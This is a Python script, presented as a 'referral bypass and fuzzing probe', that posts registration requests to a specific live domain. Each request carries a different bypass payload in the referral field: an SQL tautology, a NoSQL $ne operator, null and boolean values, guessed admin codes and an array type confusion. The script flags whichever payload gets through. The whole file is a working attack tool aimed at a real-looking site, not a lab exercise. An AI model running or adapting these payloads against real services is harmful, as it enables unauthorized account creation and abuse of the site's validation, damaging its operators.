#!/usr/bin/env python3
"""
REFERRAL BYPASS & FUZZING PROBE v7.2
Evaluates Laravel registration endpoints for referral validation bypasses.
"""
import json
from modules.transport import SecureTransport

TARGET_URL = "https://cryptobytes.online"
REGISTRATION_ENDPOINT = "/user/register"

def audit_referral_logic():
    transport = SecureTransport(TARGET_URL)
    
    # Define offensive test vectors for the referral field
    bypass_payloads = [
        {"name": "Null Value Bypass", "ref": None},
        {"name": "Boolean True Bypass", "ref": True},
        {"name": "Empty String Bypass", "ref": ""},
        {"name": "NoSQL Operator Bypass", "ref": {"$ne": None}},
        {"name": "Admin Default Code", "ref": "ADMIN001"},
        {"name": "System Root Code", "ref": "ROOT"},
        {"name": "SQL Tautology", "ref": "' OR '1'='1"},
        {"name": "Type Confusion (Array)", "ref": ["5702185"]}
    ]

    base_registration_data = {
        "name": "RedTeam Auditor",
        "email": "redteam.audit@cryptobytes.online",
        "password": "SecureTestPassword123!",
        "password_confirmation": "SecureTestPassword123!",
        "terms": "1"
    }

    print(f"[*] Initiating referral validation audit against {TARGET_URL}{REGISTRATION_ENDPOINT}...\n")

    for test in bypass_payloads:
        payload = base_registration_data.copy()
        # Test both common Laravel referral parameter naming conventions
        payload["referral"] = test["ref"]
        payload["ref"] = test["ref"]

        status, headers, body = transport.request("POST", REGISTRATION_ENDPOINT, payload=payload)
        
        print(f"[-] Test: {test['name']} (Payload: {test['ref']})")
        print(f"    -> Status: {status}")
        print(f"    -> Response Snippet: {body[:150].strip()}\n")

        if status in [200, 201, 302] and "error" not in body.lower() and "user not found" not in body.lower():
            print(f"[!] SUCCESS! Referral validation bypassed using: {test['name']}")
            break

if __name__ == "__main__":
    audit_referral_logic()
